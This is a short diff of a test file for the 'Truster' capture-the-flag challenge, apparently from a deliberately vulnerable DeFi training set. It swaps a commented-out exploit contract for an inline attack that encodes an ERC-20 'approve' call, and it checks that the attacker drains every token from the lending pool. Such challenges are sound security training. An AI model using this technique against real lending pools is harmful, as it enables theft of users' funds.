@@ -33,15 +33,6 @@ describe("[Challenge] Truster", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
-    // const TrusterExploit = await ethers.getContractFactory(
-    //   "TrusterExploit",
-    //   attacker
-    // );
-    // this.exploit = await TrusterExploit.deploy();
-    // await this.exploit
-    //   .connect(attacker)
-    //   .attack(this.pool.address, this.token.address);
-    //alternative below with no separate contract//
     const iface = new ethers.utils.Interface([
       "function approve(address spender, uint256 amount)",
     ]);
@@ -59,10 +50,6 @@ describe("[Challenge] Truster", function () {
 
   after(async function () {
     /** SUCCESS CONDITIONS */
-    // this.exploit = await TrusterExploit.new({ from: attacker });
-    // await this.exploit.attack(this.pool.address, this.token.address, {
-    //   from: attacker,
-    // });
     // Attacker has taken all tokens from the pool
     expect(await this.token.balanceOf(attacker.address)).to.equal(
       TOKENS_IN_POOL
